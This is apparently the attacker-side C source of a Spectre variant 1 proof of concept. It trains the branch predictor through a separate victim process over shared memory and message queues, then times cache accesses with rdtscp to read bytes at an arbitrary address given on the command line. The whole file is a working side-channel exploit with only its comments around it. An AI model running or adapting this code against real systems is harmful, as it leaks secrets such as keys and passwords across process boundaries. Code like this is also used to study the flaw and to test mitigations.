#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/shm.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#include "victim.h"

uint8_t *array1;
uint8_t *array2;
size_t *array1_size;

int msgid;

#define CACHE_HIT_THRESHOLD 80 /* assume cache hit if time <= threshold */

void *init_shm(int projid, size_t size) {
  key_t key1 = ftok(SHM_PATHNAME, projid);
  int shmid = shmget(key1, size, 0666);
  if (shmid == -1) {
    perror("shmget failed");
    exit(1);
  }
  void *res = shmat(shmid, NULL, 0);
  if (res == (uint8_t *)-1) {
    perror("shmat failed");
    exit(1);
  }
  return res;
}

void call_victim_function(size_t x) {
  msgsnd(msgid, &(msg_buffer){1, x}, sizeof(size_t), 0);

  // wait for victim to finish
  msg_buffer buf;
  msgrcv(msgid, &buf, sizeof(size_t), 0, 0);
}

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
  static int results[256];
  int tries, i, j, k, mix_i, junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t *addr;

  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = 999; tries > 0; tries--) {

    /* Flush array2[256*(0..255)] from cache in victim process
     * could also ask the victim to do a lot of memory-intensive
     * unrelated work to flush it ... */
    call_victim_function(0);

    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x)
     */
    training_x = tries % *array1_size;
    for (j = 29; j >= 0; j--) {

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16));         /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      call_victim_function(x);
    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &array2[mix_i * 512];
      time1 = __rdtscp(&junk);         /* READ TIMER */
      junk = *addr;                    /* MEMORY ACCESS TO TIME */
      time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % *array1_size])
        results[mix_i]++; /* cache hit - add +1 to score for this value */
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) ||
        (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
  value[0] = (uint8_t)j;
  score[0] = results[j];
  value[1] = (uint8_t)k;
  score[1] = results[k];
}

int main(int argc, const char **argv) {
  // load shared memory
  array1_size = init_shm(ARRAY1_SIZE_PROJID, sizeof(size_t));
  array1 = init_shm(ARRAY1_PROJID, *array1_size);
  array2 = init_shm(ARRAY2_PROJID, ARRAY2_SIZE);

  msgid = msgget(MSG_KEY, 0666);
  if (msgid == -1) {
    perror("msgget failed");
    exit(1);
  }

  size_t malicious_x = 0;
  int i, score[2], len = 64;
  uint8_t value[2];

  for (i = 0; i < sizeof(array2); i++)
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

  if (argc >= 2) {
    sscanf(argv[1], "%p", (void **)(&malicious_x));
    // printf("Reading at malicious_x = %p\n", (void *)malicious_x);
  }
  if (argc >= 3) {
    // malicious_x -= (size_t)array1; /* Convert input value into a pointer */
    sscanf(argv[2], "%d", &len);
  }

  char buf[len + 1];
  int idx = 0;

  printf("Reading %d bytes:\n", len);
  while (--len >= 0) {
    printf("Reading at malicious_x = %p... ", (void *)malicious_x);
    readMemoryByte(malicious_x++, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    char ch = (value[0] > 31 && (value[0] < 127) ? value[0] : '?');
    printf("0x%02X=’%c’ score=%d ", value[0], ch, score[0]);
    buf[idx++] = ch;
    if (score[1] > 0) {
      char ch2 = (value[1] > 31 && (value[1] < 127) ? value[1] : '?');
      printf("(second best: 0x%02X '%c' score=%d)", value[1], ch2, score[1]);
    }
    printf("\n");
  }
  buf[idx] = '\0';

  printf("buf: '%s'\n", buf);

  shmdt(array1);
  shmdt(array1_size);
  shmdt(array2);

  return (0);
}
